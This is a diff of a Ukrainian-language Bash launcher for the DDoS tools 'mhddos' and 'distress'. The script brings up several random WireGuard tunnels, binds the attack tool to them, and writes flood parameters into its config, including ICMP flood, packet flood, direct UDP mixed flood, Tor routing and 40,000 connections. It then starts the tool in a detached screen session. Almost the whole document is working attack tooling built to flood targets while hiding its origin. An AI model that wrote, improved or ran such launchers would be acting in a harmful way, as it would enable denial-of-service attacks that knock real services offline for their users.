@@ -3,7 +3,6 @@
 set -e
 
 #=== Підготовка середовища ===
-
 echo "[+] Перевірка користувача..."
 if [ "$(id -u)" -eq 0 ]; then
     SUDO=""
@@ -13,7 +12,7 @@ else
         SUDO="sudo"
         echo "[+] sudo доступний."
     else
-        echo "[-] sudo не знайдено. Встановіть або увійдіть як root."
+        echo "[-] sudo не знайдено. Потрібно встановити або увійти як root."
         exit 1
     fi
 fi
@@ -109,24 +108,6 @@ case $module_choice in
         ;;
 esac
 
-#=== Підготовка INI конфігурації ===
-echo "[+] Підготовка INI файлу..."
-echo "[?] Бажаєте відредагувати параметри модуля через nano? (y/n)"
-read -r edit_ini
-
-if [[ $edit_ini == "y" ]]; then
-    $SUDO nano "$CONFIG_FILE"
-else
-    echo "[+] Використовуємо базові налаштування."
-    if [[ "$MODULE_NAME" == "mhddos" ]]; then
-        echo "--use-my-ip 0 --copies auto -t 8000 --user-id=*********" > "$CONFIG_FILE"
-    elif [[ "$MODULE_NAME" == "distress" ]]; then
-        echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$CONFIG_FILE"
-    fi
-fi
-
-ARGS=$(cat "$CONFIG_FILE")
-
 #=== Вибір способу запуску ===
 RUN_MODE_FILE="$HOME/last_run_mode.txt"
 if [[ ! -s "$RUN_MODE_FILE" ]]; then
@@ -140,32 +121,45 @@ else
     run_mode=$(cat "$RUN_MODE_FILE")
 fi
 
-#=== Одиночна ініціалізація: зупинка старих WG, запуск нових і модуля ===
-echo "[+] Вимкнення всіх активних WG інтерфейсів..."
+#=== Вимкнення активних WG інтерфейсів ===
+echo "[+] Вимкнення активних WG..."
 ACTIVE_WG=$(wg show interfaces 2>/dev/null || true)
 for iface in $ACTIVE_WG; do
     $SUDO wg-quick down "$iface" || true
 done
 
-sleep 2
-
-echo "[+] Підключення нових WG конфігів..."
+#=== Підключення нових WG тунелів ===
+echo "[+] Підключення нових WG..."
 WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
+WG_IFACES=()
 for conf in "${WG_FILES[@]}"; do
     $SUDO wg-quick up "$conf" && echo "[+] Підключено: $conf"
+    iface=$(basename "$conf" .conf)
+    WG_IFACES+=("$iface")
     sleep 1
 done
 
+#=== Автоматичне доповнення INI з WG інтерфейсами ===
+echo "[+] Оновлення INI файлу модулем WG тунелів..."
+if [[ "$MODULE_NAME" == "mhddos" ]]; then
+    echo "--use-my-ip 0 --copies auto -t 8000 --user-id=********* --ifaces ${WG_IFACES[*]}" > "$CONFIG_FILE"
+elif [[ "$MODULE_NAME" == "distress" ]]; then
+    echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface $(IFS=,; echo "${WG_IFACES[*]}")" > "$CONFIG_FILE"
+fi
+
+ARGS=$(cat "$CONFIG_FILE")
+
+#=== Запуск модуля ===
 echo "[+] Запуск модуля..."
 if [[ $run_mode == "1" ]]; then
-    screen -dmS "$MODULE_NAME" bash -c "$MODULE $(cat "$CONFIG_FILE")"
+    screen -dmS "$MODULE_NAME" bash -c "$MODULE $ARGS"
 elif [[ $run_mode == "2" ]]; then
-    screen -S "$MODULE_NAME" bash -c "$MODULE $(cat "$CONFIG_FILE")"
+    screen -S "$MODULE_NAME" bash -c "$MODULE $ARGS"
 elif [[ $run_mode == "3" ]]; then
-    bash -c "$MODULE $(cat "$CONFIG_FILE")"
+    bash -c "$MODULE $ARGS"
 else
     echo "[-] Невірний вибір режиму запуску!"
     exit 1
 fi
 
-echo "[+] Робота завершена! Модуль запущено. Для контролю використовуйте 'screen -ls' або логи."
+echo "[+] Завершено. Модуль працює!"
